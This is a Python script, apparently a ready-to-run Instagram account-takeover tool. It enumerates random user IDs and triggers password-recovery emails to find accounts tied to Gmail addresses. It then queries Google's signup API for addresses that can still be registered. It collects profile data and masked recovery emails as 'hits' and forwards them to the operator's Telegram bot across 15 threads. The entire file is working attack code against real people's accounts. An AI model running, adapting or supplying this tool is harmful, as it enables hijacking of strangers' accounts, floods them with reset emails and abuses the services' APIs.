# @wizardxcoder / @wizard_tool
import os
import requests
import time
import re
import random
import string
import json
from random import choice as cc, randint as rr
from uuid import uuid4 as gg
from uuid import uuid4
from random import choice,randrange
from user_agent import generate_user_agent
import threading
lock = threading.Lock()
logo = f'''\033[1;36m
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒       
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒       
▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒       
▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒       
▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒       
▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒▒▒       
▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒▒▒       
▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒▒▒       
▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░▒▒       
▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░▒▒       
▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░▒       
▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░▒       
▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░▒       
▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░▒       
▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░▒       
▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░▒       
▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░▒       
▒░░░░░░░░████████████████████████░░░░░░░░░░▒       
▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░▒       
▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒▒       
▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒▒       
▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒▒       
▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒▒       
▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒▒       
▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒▒       
▒▒▒▒▒▒▒▒▒██▌░░░░█▄░░░░░░▄███████████████████       
▒▒▒▒▒▒▒▒▒▐██▒▒░░░██▄▄███████████████████████       
▒▒▒▒▒▒▒▒▒▒▐██▒▒▄████████████████████████████       
▒▒▒▒▒▒▒▒▒▒▄▄████████████████████████████████       
████████████████████████████████████████████       
'''
print("___________________________________________\n"+logo+"\033[1;97m\n___________________________________________\n")
token = input("\x1b[1;32m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐁𝐨𝐭 𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫𝐢𝐧: \x1b[1;33m")
# @wizardxcoder / @wizard_tool
id = input("\x1b[1;32m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐝 𝐆𝐢𝐫𝐢𝐧: \x1b[1;33m")
time.sleep(1.5)
os.system("clear")
hit_ig = 0
iyi_ig = 0
bad_ig = 0
bad_gm = 0
checked_users = []
def list_cek():
    while True:
        user_id=str(random.randrange(1,21254029834))
        csrf_token = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(32))
        datr = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
        session_id = f"{user_id}%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(10))}%3A28%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(24))}"
        cookies = {
        'datr': datr,
        'csrftoken': csrf_token,
        'ds_user_id': user_id,
        'sessionid': session_id
        }
        headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/explore/search/',
        'user-agent': generate_user_agent(),
        'x-csrftoken': csrf_token,
        'x-ig-app-id': '1217981644879628',
        }
        data = {
        'variables': json.dumps({"id": user_id, "render_surface": "PROFILE"}),
        'doc_id': '9383802848352200',
        }
        try:
            response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data)
            username = response.json()['data']['user']['username']
            email = username
            follower = response.json()["data"]["user"]["follower_count"]
            if "username" in response.text:
                return email            
        except Exception as e:
            pass#print(e)
def date(Id):
 try:
  if int(Id) >1 and int(Id)<1279000:
   return 2010
  elif int(Id)>1279001 and int(Id)<17750000:
   return 2011
  elif int(Id) > 17750001 and int(Id)<279760000:
   return 2012
  elif int(Id)>279760001 and int(Id)<900990000:
   return 2013
  elif int(Id)>900990001 and int(Id)< 1629010000:
   return 2014
  elif int(Id)>1900000000 and int(Id)<2500000000:
   return 2015
  elif int(Id)>2500000000 and int(Id)<3713668786:
   return 2016
  elif int(Id)>3713668786 and int(Id)<5699785217:
   return 2017
  elif int(Id)>5699785217 and int(Id)<8507940634:
   return 2018
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 2019
  else:
   return "2020-2023"
 except BaseException as Wizard :
  return Wizard
def info(email):
    username = email.split("@")[0]
    rest_headers = {
        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
    rest_data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
        'ig_sig_key_version': '4',
    }
    reset = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=rest_headers, data=rest_data).json()["email"]
    try:
        cookies = {
            'cf_clearance': 'N0OZI7JbDfiBKN7iTlXpDw3RYxSMov80KhBHnRAOMSc-1745488156-1.2.1.1-.uOKKFMFwG3lW8Tthn_MJsv.M31PawzYv0Ix.zbM9CyysWGshYuhRm13rRqgIu6pp_5jh6Y9AOt7ao6gVGhLkaNF6XrG4CvKoLX6Oky16jAFib41mHbX0J..I.S5FVEwqzDch3vc8EF4ZC9sjXffTVYVxGblTKuzrBIOwHVH.p8ZTtpws_9jSCSHunGPdsGzYtMj4O0_vt7hXhhcAMMaVJTpATIcqMkX6h6PdxWo.OaKbEo1TENeGS2NVOm5Z8g5XwurwSynXb5UWr1_DDEEw1XOx5iJl8emEydcteCtaqzN9mleBjLiL5xLUMJwWXjz7FHQUejyNEDMrQWq6KEDCU9DPlZONCu96pbZgHg4m5J1xs0B7CNJQ8pEaTMDxwzP',
        }
        headers = {
            'authority': 'storyviewer.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://storyviewer.com',
            'referer': 'https://storyviewer.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '""',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-ch-ua-full-version': '"137.0.7337.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        json_data = {
            'username': username,
        }
        r = requests.post('https://storyviewer.com/api/data', cookies=cookies, headers=headers, json=json_data).json()
        takipci = r['user_info']['followers']
        tam_isim = r['user_info']['full_name']
        user_idd = r['user_info']['id']
        takip_edilen = r['user_info']['following']
        post = r['user_info']['posts']        
        text = f'''
𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇
──────────────────────
❄️𝐇𝐈𝐓 : {hit_ig}
❄️𝐈𝐒𝐈𝐌 : {tam_isim}
❄️𝐊𝐔𝐋𝐋𝐀𝐍𝐈𝐂𝐈 𝐀𝐃𝐈 : @{username}
❄️𝐄𝐌𝐀𝐈𝐋 : {email}
❄️𝐓𝐀𝐊𝐈̇𝐏𝐂̧𝐈̇ : {takipci}
❄️𝐓𝐀𝐊𝐈̇𝐏 : {takip_edilen}
❄️𝐈𝐃 : {user_idd}
❄️𝐊𝐔𝐑𝐔𝐋𝐔𝐌 : {date(r["id2"])}
❄️𝐏𝐎𝐒𝐓 : {post}
❄️𝐑𝐄𝐒𝐄𝐓: {reset}
──────────────────────
❄️𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 : @wizardxcoder | @wizard_tool'''        
        with lock:
            with open("hit_wizard.txt", "a") as kaydet:
                kaydet.write(text + "\n")
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}")        
    except Exception as wizoo:
        text = f'''
𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇
──────────────────────
❄️𝐇𝐈𝐓 : {hit_ig}
❄️𝐊𝐔𝐋𝐋𝐀𝐍𝐈𝐂𝐈 𝐀𝐃𝐈 : @{username}
❄️𝐄𝐌𝐀𝐈𝐋 : {email}
❄️𝐑𝐄𝐒𝐄𝐓: {reset}
──────────────────────
❄️𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 : @wizardxcoder | @wizard_tool'''        
        with lock:
            with open("hit_wizard.txt", "a") as kaydet:
                kaydet.write(text + "\n")
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}")
def check_ig(email):
	cookies = {
	'csrftoken':'X2my0jz_gM8Fx0AFuTnDUA',
	'dpr':'2.75',
	'datr':'izhAZ-wDTHDpFTMZgOD8qLjH',
	'ig_did':'55A1ED1E-32F8-4AE3-9938-7C60526941D6',
	'mid':'Z0A4iwABAAHexmqymQnKLZLEn6A7',
	'wd':'393x767'
	}
	headers = {
	'content-type':'application/x-www-form-urlencoded',
	'origin':'https://www.instagram.com',
	'referer':'https://www.instagram.com/accounts/password/reset/?source=fxcal',
	'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	'x-csrftoken':'X2my0jz_gM8Fx0AFuTnDUA'
	}
	data = {
	'email_or_username':email,
	'flow':'fxcal'
	}
	response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', data=data, headers=headers, cookies=cookies)
	if '"email_or_sms_sent":true' in response.text:
		return True
	else:
		return False
def check_gm(email):
	try:
		n1=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(6,9)))
		n2=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(3,9)))
		host=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(15,30)))
		headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(gg())}
		res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=headers_init)
		tok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2)
		cookies={'__Host-GAPS':host}
		headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(gg())}
		data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
		response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data)
		tl=str(response.text).split('",null,"')[1].split('"')[0]
		host=response.cookies.get_dict()['__Host-GAPS']
		if'@'in email:email=str(email).split('@')[0]
		cookies={'__Host-GAPS':host}
		headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(gg())}
		params={'TL':tl}
		data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
		response=requests.post('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
		if '"gf.uar",1'in response.text:
			return True
		elif '"gf.uar",2'in response.text or '"gf.uar",3' in response.text:
			return False
		else:
			return False
	except:
		return False
def arayuz(email):
	os.system("clear")
	print("\033[1;97m___________________________________________\n"+logo+"\033[1;97m\n___________________________________________\n")
	print(f'''\x1b[1;32m✅ 𝐇𝐈𝐓 𝐈𝐍𝐒𝐓𝐀: [ {hit_ig} ]    \n\x1b[1;33m🟨 𝐈𝐘𝐈 𝐈𝐍𝐒𝐓𝐀: [ {iyi_ig} ]    \n\x1b[1;31m❌ 𝐊𝐎𝐓𝐔 𝐈𝐍𝐒𝐓𝐀: [ {bad_ig} ]    \n\x1b[1;31m❌ 𝐊𝐎𝐓𝐔 𝐆𝐌𝐀𝐈𝐋: [ {bad_gm} ]    \n\033[1;36m📥 𝐄𝐌𝐀𝐈𝐋: [ {email} ]    ''')
	print("\033[1;97m\n___________________________________________\n")
def main():
    global hit_ig, iyi_ig, bad_ig, bad_gm
    while True:
        try:
            username = list_cek()            
            if username in checked_users:
                continue
            checked_users.append(username)     
            email = username + "@gmail.com"
            chk_ig = check_ig(email)           
            if chk_ig:
                iyi_ig += 1
                arayuz(email)                
                chk_gm = check_gm(email)
                if chk_gm:
                    hit_ig += 1
                    info(email)
                    arayuz(email)
                else:
                    bad_gm += 1
                    arayuz(email)
            else:
                bad_ig += 1
                arayuz(email)                
        except Exception as wizardd:
            pass
for WIZARD in range(15):
    threading.Thread(target=main).start()
# @wizardxcoder / @wizard_tool